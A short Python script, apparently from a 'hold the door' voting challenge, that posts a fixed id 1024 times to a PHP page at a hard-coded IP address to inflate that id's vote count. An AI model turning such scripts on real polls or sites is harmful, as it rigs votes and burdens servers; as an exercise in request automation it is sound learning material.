#!/usr/bin/python3
"""Module for to vote for my id. push 1024 times."""
import requests

page = "http://158.69.76.135/level0.php"
inyeccion = {"id": "930", "holdthedoor": "Submit"}

for cont in range(0, 1024):
    requests.post(page, data=inyeccion)
print("congrats,for you vote")
